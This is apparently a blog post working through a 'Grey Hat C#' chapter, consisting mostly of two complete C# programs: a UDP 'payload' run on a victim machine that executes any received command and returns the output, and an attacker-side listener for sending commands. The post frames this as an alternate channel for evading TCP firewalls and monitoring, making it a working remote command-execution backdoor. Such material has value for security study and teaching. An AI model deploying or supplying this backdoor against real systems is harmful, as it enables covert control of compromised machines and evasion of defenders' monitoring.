---
title: Creating a UDP listener and payload. 
date: 2021-07-09 12:50:47 +07:00
categories: greyhatcch4
#modified: 20-08-29 09:24:47 +07:00
#tags: [blog, netlify, jekyll, github]
description: Creating a UDP listener and payload.
---

## We write a program to create a UDP payload and a listener to implement a UDP remote connection as an alternate channel of communication.

- UDP payloads/listeners can be used as an alternate channel of communication in monitored environments and are not heavily scrutinized. It is a connectionless protocol with no overhead to ensure deliverability hence it is blazingly fast.

- We use the UdpClient and Socket classes over UDP. 

- Both the attacker and victim machines will need to listen for UDP broadcasts as well as maintain a socket to broadcast data to another computer.

- The code on the target machine will listen on a UDP port for commands, execute them and return the output to the attacker's UDP socket, while the attacker maintains a listener and socket to execute pass these commands.

## CODE:

### UDP Payload -->

```csharp
using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;

// UDP payloads are used as an alternative to hosts that are heavily TCP firewalled, wherein both the target and attacker maintain a listening socket to broadcast data to each other.

namespace UDP_payload
{
    public class MainClass
    {
        public static void Main(string[] args)
        {
            Console.WriteLine("[+] Runnning UDP payload on port: " + args[0]);
            int lport = int.Parse(args[0]);
            using (UdpClient listener = new UdpClient(lport))
            {
                // Local Endpoint
                IPEndPoint localEP = new IPEndPoint(IPAddress.Any, lport);
                string cmd;
                byte[] input;

                // Recieving data from broadcasts, loops continiously until an empty string is recieved; Also blocks exec until a broadcast is recieved.
                while (true)
                {
                    // Recieve fills localEP address property with attackers IP and other connection info
                    input = listener.Receive(ref localEP);
                    cmd = Encoding.ASCII.GetString(input, 0, input.Length);
                    if (string.IsNullOrEmpty(cmd))
                    {
                        listener.Close();
                        return;
                    }

                    if (string.IsNullOrWhiteSpace(cmd))
                        continue;
                    string[] split = cmd.Trim().Split(' ');
                    string filename = split.First();
                    string arg = string.Join(" ", split.Skip(1));
                    string results = string.Empty;

                    // Executing the cmd and returning result to the sender
                    try
                    {
                        // Start local process
                        Process prc = new Process();
                        // Adding additional properties the the Process class
                        prc.StartInfo = new ProcessStartInfo();
                        prc.StartInfo.FileName = filename;
                        prc.StartInfo.Arguments = arg;
                        prc.StartInfo.UseShellExecute = false;
                        prc.StartInfo.RedirectStandardOutput = true;
                        prc.Start();
                        // Wait until process exits
                        prc.WaitForExit();
                        results = prc.StandardOutput.ReadToEnd();
                    }
                    catch
                    {
                        results = "[!] There was an error running the following command: " + filename + "\t" + arg;
                    }
                    //Creating UDP socket
                    using (Socket sock = new Socket(AddressFamily.InterNetwork,
                        SocketType.Dgram, ProtocolType.Udp))
                    {
                        IPAddress sender = localEP.Address;
                        // Creating new endpoint using senders IP
                        IPEndPoint remoteEP = new IPEndPoint(sender, lport);
                        byte[] resultBytes = Encoding.ASCII.GetBytes(results);
                        sock.SendTo(resultBytes, remoteEP);
                    }
                }

            }

        }
    }
}
```

### UDP Listener -->

```csharp
using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;

namespace UDP_listener
{
    public class MainClass
    {
        public static void Main(string[] args)
        {
            Console.WriteLine("[+] Running UDP client/listener");
            int lport = int.Parse(args[1]);
            using (UdpClient listener = new UdpClient(lport))
            {
                // Create local listener endpoint at 0.0.0.0 at specified port
                IPEndPoint localEP = new IPEndPoint(IPAddress.Any, lport);
                string output;
                byte[] bytes;

                // Creating variables to send UDP Broadcasts
                using (Socket sock = new(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
                {
                    // Convert to IPaddrs type Class
                    IPAddress addr = IPAddress.Parse(args[0]);
                    IPEndPoint addrEP = new IPEndPoint(addr, lport);

                    // Communicating with the target
                    Console.WriteLine("[+] Enter a command to send, or a blank line to quit");
                    while (true)
                    {
                        // Read cmd from std i/p
                        string command = Console.ReadLine();
                        byte[] buff = Encoding.ASCII.GetBytes(command);

                        try
                        {
                            sock.SendTo(buff, addrEP);

                            if (string.IsNullOrEmpty(command))
                            {
                                sock.Close();
                                listener.Close();
                                return;
                            }

                            if (string.IsNullOrWhiteSpace(command))
                                continue;

                            bytes = listener.Receive(ref localEP);
                            output = Encoding.ASCII.GetString(bytes, 0, bytes.Length);
                            Console.WriteLine(output);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("[!] Exception{0}", ex.Message);
                        }
                    }
                }
            }
        }
    }
}
```


## OUTPUT:

### Attacker -->

![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/coding/csharp/greyhatc/Ch4/UDP%20payload/udp_listener.png)

### Target Victim -->

![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/coding/csharp/greyhatc/Ch4/UDP%20payload/udp_payload.png)